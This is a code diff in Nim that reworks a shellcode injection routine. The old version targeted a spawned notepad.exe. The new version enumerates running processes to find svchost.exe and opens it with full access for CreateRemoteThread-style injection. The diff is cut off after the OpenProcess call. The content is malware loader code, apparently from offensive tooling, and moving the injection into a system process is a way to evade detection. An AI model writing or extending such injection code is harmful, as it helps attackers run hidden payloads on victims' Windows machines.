@@ -1,16 +1,42 @@
-import winim/lean
-import osproc
+import winim
 
-proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
+proc byteToString(bytes: auto): string = 
+    var results: string = ""
 
-    let tProcess = startProcess("notepad.exe")
-    tProcess.suspend()
-    defer: tProcess.close()
+    for b in bytes:
+        if b == 0:
+            break
+
+        results.add(char(b))
+    
+    return results
+
+proc svcHostPid(): int = 
+
+    var 
+        entry: PROCESSENTRY32
+        hSnapshot: HANDLE
+
+    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    defer: CloseHandle(hSnapshot)
+
+    if Process32First(hSnapshot, addr entry):
+        while Process32Next(hSnapshot, addr entry):      
+            if byteToString(entry.szExeFile) == "svchost.exe":
+                return int(entry.th32ProcessID)
+
+    return 0
+
+
+proc injectCreateRemoteThread*[I, T](shellcode: array[I, T]): void =
+
+    let pid = svcHostPid()
 
     let pHandle = OpenProcess(
         PROCESS_ALL_ACCESS, 
         false, 
-        cast[DWORD](tProcess.processID)
+        cast[DWORD](pid)
     )
     defer: CloseHandle(pHandle)
 
